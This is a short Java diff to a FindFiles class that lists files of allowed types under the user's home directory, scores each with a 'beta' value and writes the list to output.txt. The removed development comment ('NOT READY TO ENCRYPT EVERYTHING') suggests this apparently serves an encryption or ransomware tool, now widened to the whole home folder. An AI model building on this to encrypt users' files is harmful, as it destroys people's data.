@@ -41,9 +41,6 @@ public class FindFiles {
 
         String home = System.getProperty("user.home");
 
-        //FOR DEVELOPMENT - NOT READY TO ENCRYPT EVERYTHING - JUST THE DOCUMENTS FOLDER
-        //String home = System.getProperty("user.home")+ File.separator + "Desktop" + File.separator + "Documents";
-
         //Creating a file to write the files found into
         Writer writer = new FileWriter(System.getProperty("user.home") + File.separator + "output.txt", false);
         fileWriter = new BufferedWriter(writer);
@@ -82,7 +79,6 @@ public class FindFiles {
                 if(allowedFiles.contains("." + fileType.toUpperCase())) {
                     double beta = fs.calculateBeta(f);
                     fileWriter.write(f.getAbsolutePath() + ", " + beta);
-                    System.out.println(f.getAbsolutePath() + ", " + beta);
                     fileWriter.newLine();
                 }
             }
